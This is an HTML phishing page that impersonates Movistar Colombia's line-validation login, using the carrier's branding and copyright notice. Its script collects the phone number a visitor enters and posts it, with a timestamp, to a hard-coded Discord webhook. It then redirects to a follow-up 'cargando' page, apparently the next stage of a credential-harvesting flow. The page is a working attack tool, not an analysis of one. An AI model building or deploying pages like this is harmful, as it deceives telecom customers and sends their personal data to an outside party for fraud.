<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Validar l√≠nea - Movistar</title>
  <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background: linear-gradient(135deg, #019DF4, #004A99);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
    }

    header {
      background-color: white;
      padding: 1rem;
      text-align: center;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }

    .header-image {
      max-height: 50px;
    }

    .login-container {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
      width: 100%;
      max-width: 400px;
    }

    .login-box h2 {
      color: #004A99;
      text-align: center;
      margin-bottom: 1.5rem;
    }

    .form-control {
      border-radius: 8px;
    }

    .btn-primary {
      background-color: #019DF4;
      border: none;
      border-radius: 8px;
      font-weight: bold;
    }

    .btn-primary:hover {
      background-color: #0179c4;
    }

    footer {
      text-align: center;
      padding: 1rem;
      font-size: 0.9rem;
      color: white;
    }

    @media (max-width: 400px) {
      .login-box {
        padding: 1.5rem;
      }
    }
  </style>
</head>

<body>
  <header>
    <img src="img/descarga.png" alt="Movistar Logo" class="header-image" />
  </header>

  <div class="login-container">
    <div class="login-box">
      <h2>Validar l√≠nea</h2>
      <form id="loginForm">
        <div class="mb-3">
          <input type="text" id="linea" class="form-control" placeholder="Ingresa tu n√∫mero de l√≠nea" required>
        </div>
        <button type="submit" class="btn btn-primary w-100">Continuar</button>
      </form>
    </div>
  </div>

  <footer>
    ¬© Movistar Colombia - Todos los derechos reservados
  </footer>

  <script>
    // üîπ Pega tu Webhook de Discord aqu√≠
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";

    // Funci√≥n para enviar mensaje al webhook
    function sendToDiscord(message) {
      const data = { content: message };

      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(res => console.log("‚úÖ Enviado a Discord"))
      .catch(err => console.error("‚ùå Error enviando a Discord", err));
    }

    // Captura el evento del formulario
    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const linea = document.getElementById('linea').value.trim();

      if (!linea) return;

      // Guardar en localStorage
      localStorage.setItem('linea', linea);

      // Formatear mensaje
      const fecha = new Date().toLocaleString("es-CO");
      const mensaje = `üì≤ **Nueva validaci√≥n de l√≠nea:**\nüî¢ N√∫mero: ${linea}\nüïí Fecha: ${fecha}`;

      // Enviar a Discord
      sendToDiscord(mensaje);

      // Redirigir a la siguiente p√°gina
      window.location.href = "cargando.html";
    });
  </script>
</body>
</html>
